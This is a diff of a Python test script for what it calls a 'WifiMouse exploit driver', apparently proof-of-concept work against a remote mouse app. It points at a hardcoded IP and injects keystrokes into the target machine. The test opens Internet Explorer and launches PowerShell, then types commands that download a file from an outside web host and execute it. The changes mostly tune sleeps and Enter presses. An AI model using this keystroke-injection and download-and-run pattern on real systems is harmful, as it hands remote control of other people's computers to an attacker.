@@ -2,7 +2,7 @@ import sys
 from wifimouse_driver import WifiMouseDriver as driver
 from time import sleep
 
-IP = '18.250.7.143'
+IP = '18.250.6.132'
 
 """
 Tests the WifiMouse exploit driver by:
@@ -43,9 +43,7 @@ use the browser itself by navigating to another page. F4 shortcut is IE-specific
 """
 def test_open_url(r):
     open_url("http://www.yahoo.com/\n", r)
-    sleep(1.5)
     r.press_action_key("F4")
-    sleep(0.2)
     r.type("www.google.com\n")
     r.press_action_key('ENTER')
 
@@ -59,9 +57,12 @@ def test_powershell(r):
     r.type('powershell\n')
     r.press_action_key('ENTER')
     sleep(4)
-    r.type('$c = new-object System.Net.WebClient\n') \
+    r.type('$c = new-object System.Net.WebClient') \
+     .press_action_key('ENTER') \
      .type('$c.DownloadFile("http://mit.edu/img/BackImage.jpg","Desktop\\BackImage.jpg")\n') \
-     .type('.\\Desktop\\BackImage.jpg\n')
+     .press_action_key('ENTER') \
+     .type('.\\Desktop\\BackImage.jpg') \
+     .press_action_key('ENTER')
 
 def test_ping(r):
     r.left_click()
@@ -70,11 +71,13 @@ def test_ping(r):
 def open_url(website, r):
     r.move_mouse(-2000,2000).left_click()
     sleep(0.5)
-    r.type('Internet Explorer')
-    r.press_action_key("ENTER")
+    r.type('Internet Explorer') \
+     .press_action_key("ENTER")
+    sleep(5)
     r.press_action_key("F4")
     r.type(website)
     r.press_action_key("ENTER")
+    sleep(5)
 
 if __name__ == "__main__":
     main()
